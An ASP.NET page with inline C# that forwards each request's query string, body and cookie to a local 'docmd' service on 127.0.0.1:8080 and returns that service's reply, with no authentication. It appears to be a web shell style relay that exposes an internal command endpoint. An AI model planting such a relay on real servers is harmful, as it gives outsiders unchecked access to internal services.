<%@ Page Language="C#" Debug="true"%>
<script runat="server">

    protected void Page_Load(object sender, EventArgs e)
    {
        string s = @"http://127.0.0.1:8080/docmd?" + ClientQueryString;
        s = HttpUtility.UrlDecode(s);
        byte[] buffer = new byte[Request.InputStream.Length];
        Request.InputStream.Read(buffer, 0, buffer.Length);
        System.Net.WebClient wc = new System.Net.WebClient();
        NameValueCollection headers = Request.Headers;
        for(int i=0;i<headers.Count;i++)
        {
            //Response.Write(headers.GetKey(i) + ":" + headers.Get(i) + "<BR>");
            if (headers.GetKey(i) == "Cookie")
            {
                wc.Headers.Add("Cookie", headers.Get(i));
                break;
            }
        }
        byte[] ret = wc.UploadData(s, buffer);
        for(int i=0;i<wc.ResponseHeaders.Count;i++)
        {
            Response.Headers.Add(wc.ResponseHeaders.GetKey(i), wc.ResponseHeaders.Get(i));
        }
        Response.BinaryWrite(ret);
    }
 
</script>